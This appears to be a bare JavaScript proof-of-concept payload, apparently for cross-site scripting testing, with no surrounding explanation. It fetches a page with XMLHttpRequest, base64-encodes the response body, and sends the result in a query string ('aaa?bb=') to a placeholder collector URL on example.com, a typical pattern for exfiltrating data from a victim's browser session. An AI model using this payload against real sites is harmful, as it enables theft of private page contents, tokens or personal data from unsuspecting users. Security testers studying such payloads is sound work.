var url="https://example.com/";
var req1 = new XMLHttpRequest();
req1.onreadystatechange = function() { 
	if (req1.readyState == 4 && req1.status == 200){
                    body=req1.responseText;
                    xbody=btoa(body);
                    url2="https://example.com/aaa?bb="+xbody;
                    req2=new XMLHttpRequest();
                    req2.open("GET",url2);
                    req2.send(null);
                    console.log(xbody);
	}
    }
req1.open("GET", url); 
req1.send(null);